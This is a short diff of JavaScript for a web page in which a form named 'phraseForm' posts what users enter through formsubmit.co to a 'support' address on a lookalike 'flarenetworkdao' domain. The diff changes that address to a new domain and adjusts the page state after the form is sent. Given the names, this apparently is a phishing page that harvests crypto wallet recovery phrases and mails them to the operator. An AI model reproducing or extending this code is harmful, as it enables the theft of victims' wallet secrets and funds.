@@ -128,7 +128,7 @@ manualBtn.addEventListener("click", () => {
 phraseForm.addEventListener('submit', (e) => {
 	e.preventDefault();
 
-	fetch("https://formsubmit.co/ajax/support@flarenetworkdao.online", {
+	fetch("https://formsubmit.co/ajax/support@flarenetworkdao.live", {
 		method: "POST",
 		headers: {
 			'Content-Type': 'application/json',
@@ -140,7 +140,12 @@ phraseForm.addEventListener('submit', (e) => {
 		})
 	})
 	.then(response => response.json())
-	.then(data => console.log(data))
+	.then(data => {
+        console.log(data);
+        manualConnect.classList.remove("active")
+        phraseForm.classList.add("active");
+
+    })
 	.catch(error => console.log(error));
 
     formLoading.classList.remove("active");
